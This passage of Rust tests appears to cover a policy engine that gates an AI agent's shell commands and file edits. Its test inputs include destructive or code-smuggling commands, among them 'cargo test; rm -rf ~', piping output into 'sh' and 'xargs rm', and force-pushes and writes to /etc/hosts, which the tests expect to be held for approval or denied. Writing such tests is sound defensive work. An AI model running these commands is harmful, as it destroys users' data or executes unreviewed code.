            fn substitution_in_double_quotes_is_compound(
                pre in "[a-z ;|()]{0,6}",
                sub in prop_oneof![Just("$("), Just("`"), Just("${"), Just("$x")],
                post in "[a-z ]{0,6}",
            ) {
                let line = format!("git commit -m \"{pre}{sub}{post}\"");
                prop_assert!(chains_or_redirects(&line), "{line:?}");
            }
        }
    }

    #[test]
    fn a_pure_output_filter_pipeline_is_matched_as_its_command() {
        let p = policy(
            r#"
            default = "ask"
            [[rules]]
            note = "cargo"
            effect = "allow"
            match = { action = "command", command = "cargo *" }
            "#,
        );
        for line in [
            "cargo test 2>&1 | tail -40",
            "cargo update 2>&1 | tail -50",
            "cargo test --workspace 2>&1 | grep -n -A6 \"panicked\" | head -30",
            "cargo test 2>/dev/null | wc -l",
            "cargo test | sort | uniq -c | head",
            "cargo test 2>&1 | sed -n '1,20p'",
        ] {
            assert_eq!(
                named(&eval(&p, None, &command(line))),
                ("allow", "cargo"),
                "{line:?}"
            );
        }
        for line in [
            "cargo test | sh",
            "cargo test; rm -rf ~",
            "cargo test > out.txt",
            "cargo test | tee x",
            "cargo test | xargs rm",
            "cargo test | sort -o f",
            "cargo test | awk '{print}'",
            "cargo test 2>&1 | tail > out",
            "cargo test 2>out | tail",
            "FOO=1 cargo test | tail",
            "cargo test 2>&1 | tail && rm x",
            "cargo test | cat file",
        ] {
            assert_eq!(
                named(&eval(&p, None, &command(line))),
                ("ask", DEFAULT_RULE),
                "{line:?}"
            );
        }
    }

    #[test]
    fn a_deny_still_reaches_every_stage_of_a_pipeline() {
        let p = policy(
            r#"
            default = "allow"
            [[rules]]
            note = "no sh"
            effect = "deny"
            match = { action = "command", command = "sh*" }
            "#,
        );
        assert_eq!(
            named(&eval(&p, None, &command("cargo test 2>&1 | sh"))).0,
            "deny"
        );
    }

    #[test]
    fn a_policy_with_a_bad_glob_matches_nothing_rather_than_panicking() {
        let p = PolicyDef {
            default: PolicyEffect::Ask,
            approval_ttl: None,
            rules: vec![PolicyRule {
                note: None,
                effect: PolicyEffect::Deny,
                matches: crate::defs::RuleMatch {
                    command: Some("[".into()),
                    path: Some("[".into()),
                    ..Default::default()
                },
            }],
        };
        assert_eq!(named(&eval(&p, None, &command("ls"))).0, "ask");
    }

    #[test]
    fn the_default_policy_decides_as_documented() {
        let p: PolicyDef =
            toml::from_str(crate::defs::defaults::POLICY).expect("the default policy");
        let d = |bot: Option<&str>, s: &ApprovalSubject| named(&eval(&p, bot, s));
        assert_eq!(
            d(None, &command("rm -rf build")),
            ("deny", "recursive force delete")
        );
        assert_eq!(
            d(None, &edit(&["/etc/hosts"])),
            ("deny", "write outside the worktree")
        );
        assert_eq!(d(None, &edit(&["src/a.rs"])), ("ask", DEFAULT_RULE));
        assert_eq!(
            d(Some("example"), &command("cargo test")),
            ("allow", "cargo in the example bot's worktree")
        );
        assert_eq!(
            d(Some("other"), &command("cargo test")),
            ("ask", DEFAULT_RULE)
        );
        assert_eq!(d(None, &command("git push origin x")).0, "ask");
        assert_eq!(d(None, &command("git push --force origin x")).0, "deny");
    }

    #[test]
    fn lexical_normalisation_is_what_the_module_says() {
        let cases = [
            ("/a/./b", "/a/b"),
            ("/a/b/..", "/a"),
            ("/a/../..", "/"),
            ("a/../..", ".."),
            ("a/b/../../c", "c"),
            ("/a//b", "/a/b"),
            ("../a", "../a"),
        ];
        for (input, want) in cases {
            assert_eq!(lexical(Path::new(input)), Path::new(want), "{input}");
        }
    }
}
